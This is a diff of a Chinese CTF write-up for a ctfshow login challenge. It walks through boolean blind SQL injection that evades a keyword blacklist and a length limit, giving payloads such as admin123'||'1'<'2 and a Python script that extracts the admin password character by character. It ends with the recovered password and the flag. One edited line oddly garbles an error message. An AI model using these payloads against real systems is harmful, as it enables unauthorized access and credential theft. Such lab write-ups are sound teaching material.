@@ -180,7 +180,7 @@ echo sprintf($sql,$user);
 
 ![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_3.jpg)
 
-分别有四种回显：`我报警了`，`用户名错误`,`用户名/密码错误`,`原生SQL报错`
+分别有四种回显：`我报警了`，`用户···········错误`,`用户名/密码错误`,`原生SQL报错`
 
 第一种明显就是直接黑名单了，`or,select,limit,order by,concat,group_concat,database,....`都被过滤掉了
 
@@ -188,4 +188,49 @@ echo sprintf($sql,$user);
 
 ##### 解题
 
-接下来就是探寻如何解题，首先想到报错注入，但是啊，gourp_concat和concat被ban掉了，好像爆不出来
+接下来就是探寻如何解题，首先想到报错注入，但是啊，gourp_concat和concat被ban掉了，好像爆不出来，那么按照优先级：**`union>报错>盲注>时间盲注`，那么我们尝试bool盲注，使用`||`拼接，**
+
+**尝试payload:`admin123'||'1'<'2`，`>=`都被ban了，单引号就是为了闭合，在用户名不匹配时，||前面才是false，后面就可以由我们自己产生想要的bool值**，如上payload返回：
+
+![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_4.jpg)
+
+我们再构造payload：`admin123'||'1'<'1`
+
+![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_5.jpg)
+
+可见，产生不同的回显，那么我们就可以编写盲注脚本进行猜解了
+
+首先我们可以确定存在admin用户，那么接下来获取其密码，但是**经过多次试验，对payload有长度限制，当输入`admin'||length(p)<30'`和`admin'||length(p)<3'`的回显不一样，一个会返回用户名错误，一个会返回报错，实际这条SQL语句确实会报错**，说明后端对用户名有长度限制，
+
+emmm，无所谓，改一下`a'||length(p)<30||'`，这个为基础先用BP重放得到p字段的长度，<15,<20,<19,<18,<17，最后得到p字段长度为17 
+
+下面编写脚本得到密码：
+
+```python
+import requests
+
+url='http://d824de54-d045-47c7-a554-dac4d607ed57.challenge.ctf.show/admin/checklogin.php'
+#按照ASCII大小排序
+str='1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+password=''
+for j in range(1,18):
+    for i in str:
+        payload="'||substr(p,%d,1)<'%s"%(j,i)
+        data={
+            "u":payload,
+            "p":1
+        }
+        resp=requests.post(url=url,data=data)
+        # print(resp.text)
+        if "密码错误" in resp.text and "用户名" not in resp.text:
+            password+=chr(ord(i)-1)
+            print(password)
+            break
+        pass
+    pass
+print("password:"+password)
+```
+
+最后得到密码:`cptbtptpbcptdtptp`
+
+登录得flag：`ctfshow{9cbc6211-d74d-4ee0-8055-2d434614e27b}`
